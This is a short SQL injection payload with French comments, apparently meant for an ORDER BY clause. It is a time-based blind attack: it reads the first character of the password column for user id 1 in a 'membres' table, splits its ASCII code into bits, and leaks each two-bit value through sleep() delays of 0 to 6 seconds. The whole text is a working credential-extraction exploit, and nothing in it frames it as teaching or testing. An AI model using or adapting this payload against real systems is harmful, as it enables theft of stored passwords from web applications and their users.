ASC,(
	select (
		case field(
			concat(
				substring(
					bin(
						ascii(
							substring(password,1,1)
						)
					),
					1,
					1
				),
				substring( 
					bin( -- binaire du numerau ascii
						ascii( --numerau ascii du char
							substring(password,1,1) --premier char de password
						)
					),
					2,
					1
				)
			),
			concat(0,0),	--00 = 0
			concat(0,1),	--01 = 1
			concat(1,0),	--10 = 2
			concat(1,1)		--11 = 3
		)
		when 1 then TRUE 
		when 2 then sleep(2) 
		when 3 then sleep(4) 
		when 4 then sleep(6) 
	end) 
	from membres where id=1
)7